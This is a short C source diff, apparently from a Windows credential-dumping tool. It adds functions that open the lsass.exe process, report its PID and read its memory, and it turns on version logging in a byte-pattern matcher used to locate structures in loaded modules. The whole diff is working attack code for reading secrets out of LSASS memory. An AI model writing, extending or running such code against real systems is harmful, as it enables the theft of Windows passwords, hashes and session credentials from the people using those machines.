@@ -79,6 +79,25 @@ HANDLE OpenProcessByName(IN LPCWSTR lpProcName, OUT LPDWORD lpProcId)
 	*lpProcId = dwProcId;
 	return hProcHandle;
 }
+HANDLE hLsass = NULL;
+BOOL OpenLsass()
+{
+	DWORD dwLsassProcId = 0;
+	hLsass = OpenProcessByName(L"lsass.exe", &dwLsassProcId);
+	RETN_IF(hLsass == NULL, L"OpenProcessByName", FALSE);
+	MESSAGE(L"Open lsass.exe successfully, PID=%d\r\n", dwLsassProcId);
+	return TRUE;
+}
+
+VOID CloseLsass()
+{
+	CloseHandle(hLsass);
+}
+BOOL ReadLsassMemory(IN LPVOID lpPtr, OUT LPVOID lpBuf, IN DWORD cbBuf)
+{
+	SIZE_T cbMemoryRead = 0;
+	return ReadProcessMemory(hLsass, lpPtr, lpBuf, cbBuf, &cbMemoryRead);
+}
 
 ULONG64 GetModuleVersion(IN HMODULE hModule)
 {
@@ -150,7 +169,7 @@ LPVOID FindPattern(IN LPVOID lpStart, IN UCHAR ucTag, IN ULONG64 ulPattern)
 PIMAGE_PATTERN MatchPattern(IN HMODULE hModule, IN PIMAGE_PATTERN lpPattern)
 {
 	ULONG64 ulVersion = GetModuleVersion(hModule);
-	//MESSAGE(L"ulVersion: %llx\r\n", ulVersion);
+	MESSAGE(L"Module ulVersion: %llx\r\n", ulVersion);
 	PIMAGE_PATTERN lpPatternMatch = NULL;
 	for (; lpPattern->version; lpPattern++)
 	{
